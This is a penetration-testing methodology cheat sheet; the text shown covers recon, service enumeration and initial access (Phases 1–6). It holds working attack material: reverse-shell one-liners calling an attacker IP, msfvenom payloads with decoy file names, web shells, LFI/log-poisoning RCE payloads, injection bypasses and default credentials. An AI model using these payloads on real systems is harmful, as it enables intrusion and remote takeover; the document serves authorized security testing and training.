# Comprehensive Penetration Testing Methodology

> **Author:** Synthesized from CPTS Notes & Industry Best Practices  
> **Version:** 1.0 — April 2026  
> **Purpose:** A repeatable, structured, end-to-end penetration testing methodology covering every phase from preparation to reporting.

---

## Core Philosophy

> *"Distinguish between what we see and what we do not see. There are always ways to gain more information."*

### Three Foundational Principles

1. **There is more than meets the eye.** Consider all points of view — infrastructure, applications, people, and processes.
2. **Distinguish between the seen and unseen.** Active findings vs. hidden surfaces that require deeper probing.
3. **There are always ways to gain more information.** Never stop enumerating — every answer leads to new questions.

---

## Table of Contents

| Phase | Description |
|-------|-------------|
| **Phase 1** | Preparation & Environment Setup |
| **Phase 2** | External Reconnaissance & Footprinting |
| **Phase 3** | Network Enumeration & Service Discovery |
| **Phase 4** | Service-Specific Footprinting & Attacks |
| **Phase 5** | Web Application Enumeration & Attacks |
| **Phase 6** | Initial Access & Exploitation |
| **Phase 7** | Post-Exploitation: Shells, Stability & File Transfers |
| **Phase 8** | Active Directory Enumeration & Attacks |
| **Phase 9** | Pivoting, Tunneling & Port Forwarding |
| **Phase 10** | Privilege Escalation (Linux & Windows) |
| **Phase 11** | Lateral Movement & Domain Dominance |
| **Phase 12** | Password Cracking — Deep Techniques |
| **Phase 13** | Credential Hunting — Systematic Approaches |
| **Phase 14** | Service-Specific Advanced Attacks |
| **Phase 15** | Metasploit — Advanced Techniques & Evasion |
| **Phase 16** | Nmap Firewall & IDS/IPS Evasion |
| **Phase 17** | Reporting, Cleanup & Documentation |

---

# Phase 1: Preparation & Environment Setup

## 1.1 Workspace Organization

Before engaging any target, establish a clean, organized workspace:

```bash
mkdir -p {target_name}/{nmap,scans,exploits,loot,notes,downloads,screenshots}
cd {target_name}
```

Export target variables for easy reference:
```bash
export IP=10.129.x.x
export LHOST=10.10.x.x
export DOMAIN=inlanefreight.local
```

## 1.2 Session Management

Use `tmux` for managing multiple terminal windows:

| Shortcut | Action |
|----------|--------|
| `Ctrl+b, c` | New window |
| `Ctrl+b, %` | Vertical split |
| `Ctrl+b, "` | Horizontal split |
| `Ctrl+b, [arrow]` | Switch panes |
| `Ctrl+b, [index]` | Jump to window |

Recommended tmux layout:
- Window 1: VPN connection & status
- Window 2: Listeners (Netcat, Metasploit)
- Window 3: Scans (Nmap, enumeration)
- Window 4: Exploitation
- Window 5: Responder / Hash collection (AD engagements)

## 1.3 Mental Model — The Attack Layers

Visualize the target in six layers:

| Layer                      | Focus                | Information Categories                                            |
| -------------------------- | -------------------- | ----------------------------------------------------------------- |
| **1. Internet Presence**   | External footprint   | Domains, subdomains, vHosts, ASN, netblocks, IPs, cloud instances |
| **2. Gateway**             | Security controls    | Firewalls, DMZ, IPS/IDS, EDR, proxies, NAC, VPN, WAF              |
| **3. Accessible Services** | Open ports & apps    | Service type, version, configuration, interface                   |
| **4. Processes**           | Internal operations  | PID, processed data, tasks, source, destination                   |
| **5. Privileges**          | Permissions & access | Groups, users, permissions, restrictions                          |
| **6. OS Setup**            | System internals     | OS type, patch level, network config, sensitive files             |

## 1.4 Essential Tool Installation

**RustScan (fast port scanner):**
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh && source $HOME/.cargo/env && sudo apt update && sudo apt install -y build-essential gcc pkg-config libssl-dev && git clone https://github.com/RustScan/RustScan.git && cd RustScan && cargo build --release && sudo mv target/release/rustscan /usr/local/bin/
```

**Ligolo-ng (advanced pivoting):**
```bash
mkdir ~/ligolo-ng && cd ~/ligolo-ng
# Download Linux proxy (attacker)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
# Download Linux agent (for Linux pivots)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
# Download Windows agents (for Windows pivots — both amd64 and arm64)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_arm64.zip
# Extract everything
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.8.2_windows_amd64.zip
chmod +x proxy agent
```

**Wordlists:**
```bash
# rockyou.txt (password cracking)
# Available at: https://github.com/RykerWilder/rockyou.txt/tree/main
# Standard location: /usr/share/wordlists/rockyou.txt
```

---

# Phase 2: External Reconnaissance & Footprinting

## 2.1 Passive Reconnaissance — OSINT

> *"Our goal is not to get at the systems but to find all the ways to get there."*

### 2.1.1 Domain & IP Space Discovery

**WHOIS Lookups:** Identify registrar, registrant, admin/technical contacts, creation/expiration dates, and nameservers.

**ASN & IP Blocks (BGP Toolkit):**
- Use `bgp.he.net` to find ASN, IP ranges assigned to an organization
- Large corporations often own their own ASN; smaller orgs share infrastructure (Cloudflare, AWS, Azure)
- **WARNING:** Confirm scope before testing — shared infrastructure means other organizations could be affected

**Certificate Transparency Logs:**
```bash
# crt.sh — find all subdomains from SSL/TLS certificates
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .

# Filter unique subdomains
curl -s https://crt.sh/\?q\=acsiatech.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u

# Find specific subdomain patterns
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
```

**DNS Records:**
```bash
dig any inlanefreight.com
```

| Record | Purpose |
|--------|---------|
| A | IPv4 address mapping |
| AAAA | IPv6 address mapping |
| MX | Mail server identification |
| NS | Nameserver identification (reveals hosting provider) |
| TXT | SPF, DMARC, DKIM, verification keys |
| CNAME | Domain aliases |
| SOA | Administrative zone information |
| PTR | Reverse DNS lookups |

### 2.1.2 Subdomain Enumeration

**Automated Tools:**

| Tool | Best For |
|------|----------|
| `dnsenum` | Dictionary + brute-force attacks |
| `amass` | Extensive data source integration |
| `assetfinder` | Quick, lightweight scans |
| `puredns` | Effective resolving & filtering |
| `ffuf` | Host header fuzzing |
| `gobuster vhost` | Virtual host discovery |

```bash
# dnsenum brute-force
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r

# ffuf vhost enumeration
ffuf -u http://inlanefreight.htb:35684 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200,403 -t 60 -H "Host: FUZZ.inlanefreight.htb" -ac

# gobuster vhost
gobuster vhost -u http://83.136.249.164:52488 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --domain inlanefreight.htb --append-domain -t 50
```

**DNS Zone Transfer (if misconfigured):**
```bash
dig axfr @nsztm1.digi.ninja zonetransfer.me
dig axfr inlanefreight.htb @10.129.14.128
```

### 2.1.3 Cloud Resource Discovery

**Google Dorking for Cloud Storage:**
```
# AWS S3 buckets
site:s3.amazonaws.com inlanefreight
site:.s3.amazonaws.com "index of"

# Azure Blob Storage
site:blob.core.windows.net inlanefreight
site:.blob.core.windows.net "index of"
```

### 2.1.4 Staff & Technology Intelligence

- **LinkedIn:** Search for employees, job titles, and technology mentions
- **Job Postings:** Reveal tech stack, software versions, organizational structure
- **GitHub:** Employee contributions, potential code/credential leaks
- **Tool: linkedin2username** — scrapes LinkedIn, generates username combinations (flast, first.last, f.last)

### 2.1.5 Credential Hunting

**Breach Data:**
- **Dehashed:** Search for cleartext passwords/hashes from public breaches
- **HaveIBeenPwned:** Validate if emails appear in known breaches
- Even old/expired passwords are useful for building wordlists

**Code Repository Scanning:**
- **Trufflehog:** Scans Git repos for hardcoded secrets
- **Greyhat Warfare:** Searches exposed cloud storage buckets

**Google Dorks for Credentials:**
```
filetype:pdf inurl:targetdomain.com
intext:"@targetdomain.com" inurl:targetdomain.com
filetype:xls "password" site:targetdomain.com
```

## 2.2 Verification of Company-Hosted Servers

Identify hosts NOT hosted by third-party providers (you cannot test third-party hosts without their permission):

```bash
for i in $(cat subdomainlist); do
  host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4
done
```

## 2.3 Shodan Enrichment (requires API key)

```bash
for i in $(cat subdomainlist); do
  host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt
done
for i in $(cat ip-addresses.txt); do
  shodan host $i
done
```

---

# Phase 3: Network Enumeration & Service Discovery

## 3.1 Host Discovery

Identify live hosts on the network:

```bash
# Nmap ping sweep
sudo nmap -sn 10.129.2.0/24 -oA scans/discovery

# FPing (fast alternative)
fping -asgq 10.129.2.0/24
```

## 3.2 Port Scanning Strategy

### 3.2.1 Quick Scan (Top 1000 Ports)
```bash
sudo nmap $IP --top-ports=1000 --open -oA scans/quick
```

### 3.2.2 Full TCP Scan (THE STANDARD — always do this)
```bash
sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $IP -oA scans/allports
```

### 3.2.3 UDP Scan (do not skip)
```bash
sudo nmap -sU -F --top-ports 100 $IP -oA scans/udp_scan
```

### 3.2.4 RustScan (faster alternative)
```bash
rustscan -a $IP --ulimit 10000 -- -A -sC -sV -oA full_port_scan
```

## 3.3 Service & OS Detection

Extract open ports from the full scan and perform deep enumeration:

```bash
# Extract ports from allports.nmap
ports=$(grep open scans/allports.nmap | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')

# Deep service detection
sudo nmap -sC -sV -p $ports $IP -oA scans/detailed

# Aggressive scan (OS, versions, scripts, traceroute)
sudo nmap -A -p $ports $IP -oA scans/aggressive

# OS detection only
sudo nmap -O -p $ports $IP
```

### 3.3.1 Useful Nmap Flags Reference

| Flag | Description |
|------|-------------|
| `-sC` | Run default NSE scripts |
| `-sV` | Detect service versions |
| `-sU` | UDP scan |
| `-p-` | Scan all 65535 ports |
| `-O` | OS detection |
| `-A` | Aggressive (OS + versions + scripts + traceroute) |
| `--min-rate 5000` | Speed up scanning |
| `--open` | Only show open ports |
| `-vvv` | Very verbose output |
| `-n` | No DNS resolution (faster) |
| `-Pn` | Treat all hosts as online (skip ping) |
| `-oA <name>` | Output in all formats |

## 3.4 Banner Grabbing

```bash
# Via Nmap
nmap -sV --script=banner -p21 10.10.10.0/24

# Via Netcat
nc -nv <target> <port>

# Via cURL (web headers)
curl -IL https://www.inlanefreight.com
```

---

# Phase 4: Service-Specific Footprinting & Attacks

## 4.1 FTP (Port 21)

### Enumeration
```bash
# Nmap scripts
sudo nmap <ip> -sV -sC -p21 --script ftp*

# Banner grab
nc -nv <target> 21
telnet <target> 21
openssl s_client -connect <target>:21 -starttls ftp
```

### Anonymous Login & File Download
```bash
# Anonymous login
ftp -p <target>

# Download all files recursively
wget -m --no-passive ftp://anonymous:anonymous@10.129.203.7:2121

# Upload a file
touch xyz.txt
put xyz.txt
```

### TFTP (Trivial FTP — UDP, no authentication)
> TFTP uses UDP, provides no authentication, and supports basic file transfer operations.
```bash
# Interactive TFTP session
tftp <target>
tftp> get filename.txt
tftp> put filename.txt
tftp> status
tftp> quit
```

### Brute Force
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$IP
```

## 4.2 SSH (Port 22)

### Enumeration
```bash
# SSH Audit
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py 10.129.14.132

# Force password authentication
ssh -v user@<ip> -o PreferredAuthentications=Password

# Banner grab
nc -nv $IP 22

# Auth methods enumeration
nmap -p22 --script ssh-auth-methods $IP
```

### Key Usage
```bash
# Fix permissions (required for SSH to accept the key)
chmod 600 id_rsa

# Login with key
ssh -i id_rsa user@<ip>

# Generate new key pair
ssh-keygen -f key

# Inject public key into target
echo "ssh-rsa AAAAB... user@parrot" >> /root/.ssh/authorized_keys
ssh root@<ip> -i key
```

### SSH Port Forwarding
```bash
# Local port forward
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 ubuntu@10.129.202.64

# Multiple port forwards
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

# Remote port forwarding
ssh -R <pivot_ip>:8080:0.0.0.0:8000 ubuntu@<target_ip> -vN
```

## 4.3 SMB (Ports 139/445)

### Nmap Enumeration
```bash
sudo nmap <ip> -sV -sC -p139,445
nmap --script smb-os-discovery.nse -p445 10.10.10.40
```

### Share Enumeration
```bash
# smbclient — list shares (null session)
smbclient -N -L //10.129.14.128

# smbclient — connect to share
smbclient //10.129.184.50/sambashare -N
smbclient //10.129.237.95/Users -U 'alex%lol123!mD'

# smbmap
smbmap -H <ip>
smbmap -H 10.129.2.85 -u 'alex' -p 'lol123!mD'

# CrackMapExec
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```

### RPCclient Enumeration
```bash
rpcclient -U "" <ip>

# Inside rpcclient:
srvinfo
enumdomains
querydominfo
netshareenumall
netsharegetinfo <share>
enumdomusers
queryuser <RID>

# RID brute force
for i in $(seq 500 1100); do
  rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""
done
```

### enum4linux / enum4linux-ng
```bash
./enum4linux-ng.py 10.129.14.128 -A
enum4linux -P 10.129.14.128
```

## 4.4 NFS (Ports 111/2049)

### Enumeration
```bash
sudo nmap <ip> -p111,2049 -sV -sC
sudo nmap --script nfs* <ip> -sV -p111,2049

# Show available exports
showmount -e 10.129.14.128
```

### Mounting Shares
```bash
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS

# Enumerate permissions
ls -l mnt/nfs       # with usernames/group names
ls -n mnt/nfs/      # with UIDs/GUIDs

# Unmount when done
sudo umount ./target-NFS
```

### Privilege Escalation via NFS (Root Squashing Bypass)
If root squashing is not enabled, upload a SUID binary to the NFS share and execute it via SSH access.

## 4.5 DNS (Port 53 — UDP/TCP)

### Enumeration
```bash
dig ns inlanefreight.htb @10.129.14.128
dig CH TXT version.bind 10.129.120.85
dig any inlanefreight.htb @10.129.14.128

# Zone transfer
dig axfr inlanefreight.htb @10.129.14.128

# Subdomain brute force
for sub in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do
  dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt
done

# dnsenum
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

## 4.6 SMTP (Port 25)

### Enumeration
```bash
# Interactive
telnet 10.129.14.128 25
# Then: VRFY root

# Nmap
sudo nmap <ip> -sC -sV -p25
sudo nmap <ip> -p25 --script smtp-open-relay -v
nmap -p 25 --script smtp-enum-users <ip>

# smtp-user-enum
smtp-user-enum -M VRFY -U footprinting-wordlist.txt -t 10.129.148.138 -w 15 -v
```

## 4.7 IMAP / POP3 (Ports 143/993, 110/995)

### IMAP Commands
```bash
openssl s_client -connect <ip>:993 -crlf -quiet

# Login
a1 LOGIN robin robin
# List mailboxes
a5 LIST "" "*"
# Select mailbox
a9 SELECT DEV.DEPARTMENT.INT
# Fetch message
a10 FETCH 1 RFC822
# Logout
a1 LOGOUT
```

### POP3 Commands
```bash
openssl s_client -connect <ip>:pop3s

# Login
USER username
PASS password
# Check emails
STAT
LIST
RETR <id>
QUIT
```

## 4.8 SNMP (Port 161 — UDP)

### Enumeration
```bash
# onesixtyone — brute force community strings
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt <ip>

# snmpwalk with discovered community string
snmpwalk -v2c -c public 10.129.14.128
snmpwalk -v2c -c <community-string> 10.129.212.200

# braa — brute force individual OIDs
braa public@10.129.14.128:.1.3.6.*
```

## 4.9 MySQL (Port 3306)

### Enumeration & Interaction
```bash
sudo nmap <ip> -sV -sC -p3306 --script mysql*

# Connect
mysql -u <user> -p<password> -h <IP>

# Inside MySQL:
show databases;
use <database>;
show tables;
show columns from <table>;
select * from <table>;
select * from <table> where <column> = "<string>";
```

## 4.10 MSSQL (Port 1433)

### Enumeration
```bash
# Nmap comprehensive scan
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <ip>

# Impacket mssqlclient
impacket-mssqlclient ILF-SQL-01/backdoor@10.129.49.119 -windows-auth

# Enable xp_cmdshell
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

## 4.11 Oracle TNS (Port 1521)

### Enumeration
```bash
sudo nmap -p1521 -sV <ip> --open
sudo nmap -p1521 -sV <ip> --open --script oracle-sid-brute

# ODAT — Oracle Database Attacking Tool
./odat.py all -s 10.129.204.235

# SQLplus login
sqlplus scott/tiger@10.129.204.235/XE
sqlplus scott/tiger@10.129.204.235/XE as sysdba

# Extract password hashes
select name, password from sys.user$;

# File upload via ODAT
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

### Default Oracle Passwords
| Component | Username | Password |
|-----------|----------|----------|
| Oracle 9 | (DBA) | CHANGE_ON_INSTALL |
| DBSNMP | dbsnmp | dbsnmp |

## 4.12 IPMI (Port 623 — UDP)

### Enumeration
```bash
sudo nmap -sU --script ipmi-version -p 623 <target>

# Metasploit
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
```

### Default IPMI Passwords
| Product | Username | Password |
|---------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | Randomized 8-char string |
| Supermicro IPMI | ADMIN | ADMIN |

## 4.13 Linux Remote Management (SSH, Rsync, R-Services)

### Rsync (Port 873)
```bash
sudo nmap -sV -p 873 127.0.0.1
nc -nv 127.0.0.1 873
rsync -av --list-only rsync://127.0.0.1/dev
rsync -av rsync://127.0.0.1/dev
```

### R-Services (Ports 512, 513, 514)
```bash
sudo nmap -sV -p 512,513,514 10.0.17.2
rlogin 10.0.17.2 -l htb-student
rwho
rusers -al 10.0.17.5
```

## 4.14 Windows Remote Management (RDP, WinRM, WMI)

### RDP (Port 3389)
```bash
# Nmap
nmap -sV -sC <ip> -p3389 --script rdp*

# RDP security check
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
./rdp-sec-check.pl 10.129.201.248

# xfreerdp connections
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
xfreerdp /v:10.129.204.23 /u:Administrator /d:. /p:'AnotherC0mpl3xP4$$' /cert:ignore
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.204.126 /cert:ignore
xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.204.126 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution

# With drive redirection (for file exfiltration)
xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:loot,/home/htb-ac-2081772/lab
```

### WinRM (Ports 5985/5986)
```bash
nmap -sV -sC <ip> -p5985,5986 --disable-arp-ping -n
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
```

### WMI (Port 135)
```bash
/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```

### Database GUI Management Tools
| Tool | Platform | Protocols |
|------|----------|-----------|
| **DBeaver** | Multi-platform | MSSQL, MySQL, PostgreSQL, Oracle, SQLite |
| **HeidiSQL** | Windows | MySQL, MSSQL, PostgreSQL |
| **MySQL Workbench** | Multi-platform | MySQL |
| **SSMS** | Windows | MSSQL |
| **sqsh** | Linux CLI | MSSQL |

```bash
# sqsh — CLI MSSQL from Linux
sqsh -S TARGET_IP -U user -P pass
```

### Email Client Tools
| Tool | Platform | Protocol |
|------|----------|----------|
| **Evolution** | Linux GNOME | IMAP, SMTP, Exchange |
| **Thunderbird** | Multi-platform | IMAP, SMTP, POP3 |
| **Claws Mail** | Linux | IMAP, SMTP, POP3 |
| **Geary** | Linux | IMAP, SMTP |
| **mutt** | Linux CLI | IMAP, SMTP, POP3 |

### Wayback Machine (Historical Web Recon)
```bash
# web.archive.org — Historical website snapshots
# Find old pages, leaked configs, legacy APIs
curl "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey"
```

---

# Phase 5: Web Application Enumeration & Attacks

## 5.1 Technology Fingerprinting

| Tool | Purpose |
|------|---------|
| `Wappalyzer` | Browser extension — instant tech stack identification |
| `BuiltWith` | Web technology profiler (free & paid) |
| `WhatWeb` | CLI fingerprinting tool |
| `Nmap` | Service & OS fingerprinting with NSE scripts |
| `Netcraft` | Detailed technology & hosting reports |
| `wafw00f` | WAF detection & identification |

```bash
# WhatWeb
whatweb 10.10.10.121

# wafw00f — WAF detection
pip3 install git+https://github.com/EnableSecurity/wafw00f
wafw00f inlanefreight.com

# Banner grabbing (HTTP headers)
curl -I https://inlanefreight.com

# Nikto — fingerprinting only
nikto -h inlanefreight.com -Tuning b
```

## 5.2 Directory & File Enumeration

```bash
# Gobuster
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# ffuf
ffuf -u http://$IP/FUZZ -w common.txt -e .php,.txt,.html,.js
```

## 5.3 Virtual Host Discovery

Virtual hosts allow multiple websites on a single server. If a vHost has no DNS record, you must discover it via Host header fuzzing:

```bash
gobuster vhost -u http://<target_IP> -w <wordlist> --append-domain

# ffuf vhost
ffuf -u http://inlanefreight.htb:35684 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200,403 -t 60 -H "Host: FUZZ.inlanefreight.htb" -ac
```

## 5.4 Parameter & Endpoint Fuzzing

```bash
# Parameter discovery
ffuf -w params.txt:FUZZ -u 'http://target/index.php?FUZZ=val' -fs <size>

# Recursive LFI fuzzing
ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://target/index.php?lang=FUZZ'
```

## 5.5 CMS-Specific Enumeration

**WordPress:**
```bash
wpscan --url http://$IP --enumerate u,p,t
```

**Joomla:**
```bash
joomscan -u http://$IP
```

## 5.6 LFI/RFI Attacks & Bypasses

### Basic LFI
```
?page=../../../../etc/passwd
```

### PHP Filter (Base64 Encode)
```
php://filter/read=convert.base64-encode/resource=config
```

### RCE via Data Wrapper
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id
```

### Log Poisoning
1. Inject `<?php system($_GET['cmd']); ?>` into User-Agent header
2. Include `/var/log/apache2/access.log` via LFI
3. Execute commands via `?cmd=`

## 5.7 Command Injection Bypasses

| Filter | Bypass |
|--------|--------|
| Spaces blocked | `${IFS}` or `%09` (Tab) |
| Slashes blocked | `${PATH:0:1}` |
| Blacklist | `w'h'o'am'i` or `$(rev<<<'imaohw')` |

## 5.8 SQL Injection

```bash
# Manual test
' OR 1=1 -- -

# sqlmap automated
sqlmap -u "http://$IP/page?param=val" --batch
```

## 5.9 Automated Recon — FinalRecon

```bash
git clone https://github.com/thewhiteh4t/FinalRecon.git
cd FinalRecon
pip3 install -r requirements.txt
chmod +x ./finalrecon.py
./finalrecon.py --help
./finalrecon.py http://target.com    # full automated recon scan
```

### Automated Web Application Survey
```bash
# EyeWitness — Screenshot all web apps, generate HTML report
./EyeWitness.py -f urls.txt --web --no-prompt

# Aquatone — Subdomain screenshotting (Nmap/Masscan XML input)
cat subdomains.txt | aquatone -out ./screenshots
```

---

# Phase 6: Initial Access & Exploitation

## 6.1 Public Exploit Discovery

```bash
# Searchsploit
searchsploit openssh 7.2

# Metasploit
msfconsole
search exploit eternalblue
use exploit/<exploit_name>
set RHOSTS <target>
set other required options
run

# Metasploit — SMB psexec module (automated exploitation)
use exploit/windows/smb/psexec
set RHOSTS <target>
set LHOST <attacker_ip>
set SMBUser <username>
set SMBPass <password>
set SMBDomain <domain>    # found via smbmap enumeration
run
# Automatically uploads random-named exe to ADMIN$, registers service via RPC, executes
```

## 6.2 Payload Generation with MSFVenom

### Staged vs. Stageless

- **Staged:** `windows/meterpreter/reverse_tcp` (uses `/` separator) — payload is delivered in stages
- **Stageless:** `windows/meterpreter_reverse_tcp` (uses `_` separator) — entire payload delivered at once

### Linux Payloads
```bash
# Linux ELF reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf > createbackup.elf

# Linux Meterpreter
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.15.141 -f elf -o backupjob LPORT=8123
```

### Windows Payloads
```bash
# Windows EXE reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe > BonusCompensationPlanpdf.exe

# Windows Meterpreter HTTPS
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<pivot_ip> -f exe -o backupscript.exe LPORT=8080

# Windows bind shell
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

### Web Shells
```bash
# PHP reverse shell
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > shell.php

# Simple PHP web shell
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### Other Web Shell Formats
| Language | Shell |
|----------|-------|
| PHP | `<?php system($_REQUEST["cmd"]); ?>` |
| JSP | `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` |
| ASP | `<% eval request("cmd") %>` |

### Default Webroot Paths
| Web Server | Default Webroot |
|------------|-----------------|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `c:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

## 6.3 Windows Payload Types & Frameworks

### Windows Payload File Types
| Type | Extension | Description |
|------|-----------|-------------|
| **DLL** | `.dll` | Dynamic Link Library — loaded into running processes |
| **Batch** | `.bat` | DOS scripts for command-line task automation |
| **VBS** | `.vbs` | Visual Basic Script — lightweight Windows scripting |
| **MSI** | `.msi` | Windows Installer database — executes during installation |
| **PowerShell** | `.ps1` | Full shell environment and scripting language |

> All of these file types are executable in Windows. Choose based on target environment and detection evasion needs.

### Windows Fingerprinting
```cmd
# TTL values in ping responses: Windows typically returns TTL=32 or TTL=128
ping <target>
```

### Payload Generation & C2 Resources
| Resource | Description |
|----------|-------------|
| **MSFVenom & Metasploit** | Versatile payload generation and exploitation |
| **PayloadsAllTheThings** | Comprehensive cheat sheets and methodology |
| **Mythic C2 Framework** | Alternative to Metasploit as Command & Control |
| **Nishang** | Offensive PowerShell implants and scripts framework |
| **Darkarmour** | Tool to generate obfuscated binaries for Windows evasion |

### Payload Transfer & Execution Methods
| Method | Description |
|--------|-------------|
| **Impacket** | psexec, smbclient, wmi, Kerberos, SMB server |
| **SMB** | Easy file transfer between hosts |
| **Remote execution via MSF** | Built into many Metasploit exploit modules |
| **Other Protocols** | FTP, TFTP, HTTP/S, etc. |

## 6.4 Shell Types

### Reverse Shell (most common — outbound connections)
```bash
# Bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# Named pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### Bind Shell (target listens, attacker connects)
```bash
# Server side (target)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

# Client side (attacker)
nc -nv 10.129.41.200 7777
```

## 6.5 TTY Stabilization

```bash
# Step 1 — Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — Background the shell
# Press Ctrl+Z

# Step 3 — Fix local terminal
stty raw -echo

# Step 4 — Foreground the shell
fg
# Press Enter twice

# Step 5 — Set terminal environment
export TERM=xterm-256color
echo $TERM      # verify
stty size       # get rows/columns
stty rows <rows> columns <columns>
```

### Alternative Interactive Shell Spawning
```bash
# Most Linux systems have bash
/bin/bash -i
/bin/sh -i

# Perl
perl -e 'use Socket;$i="10.10.10.10";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


---

## SUPPLEMENTARY: Shells & Payloads — Advanced Reference

# ADDENDUM 02: Shells & Payloads — Advanced Techniques

## TTY Stabilization Alternatives (When Python NOT Available)

| Method | Command | Notes |
|--------|---------|-------|
| `/bin/sh` interactive | `/bin/sh -i` | Simplest, works on most Linux |
| Perl (one-liner) | `perl -e 'exec "/bin/sh";'` | Commonly pre-installed |
| Perl (inline) | `perl: exec "/bin/sh";` | Alternative syntax |
